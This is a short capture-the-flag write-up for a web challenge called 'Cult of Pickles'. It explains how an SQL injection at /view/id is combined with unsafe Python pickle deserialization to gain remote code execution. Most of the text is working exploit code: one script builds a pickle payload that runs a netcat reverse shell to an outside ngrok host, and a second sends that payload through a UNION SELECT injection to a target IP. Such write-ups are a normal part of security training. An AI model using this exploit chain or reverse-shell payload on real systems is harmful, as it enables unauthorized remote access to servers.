## introduction
The C.O.P (Cult of Pickles) have started up a new web store to sell their merch. We believe that the funds are being used to carry out illicit pickle-based propaganda operations! Investigate the site and try and find a way into their operation!
## Recons
when you checking the code,  you will see that it has an SQLI vuln at `/view/id`, but the DB dont have sensitive or import data. `app.py` uses `pickle` package,a module for serializing and deserializing data. [exploiting-python-pickle](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

```python
## expl0.py
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('nc 0.tcp.ap.ngrok.io 13889 -e /bin/sh')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

```python
## expl1.py
import requests
## payload is output from expl0.py
payload = "gASVQAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCVuYyAwLnRjcC5hcC5uZ3Jvay5pbyAxMzg4OSAtZSAvYmluL3NolIWUUpQu"
url = f'http://94.237.54.176:32530/view/\' UNION SELECT \'{payload}'
requests.get(f'http://94.237.54.176:32530/view/\' UNION SELECT \'{payload}')
```

Got it! the url corresponds to the SQL query `SELECT data FROM products WHERE id='' UNION SELECT '<payload>'`, and the pickle data is deserialized by `app.py`. For futher details on why this works, you can read the analysis of this vuln in the blog provided above. In sumary, this challenge combines between SQLI and the vuln in `pickle` package.
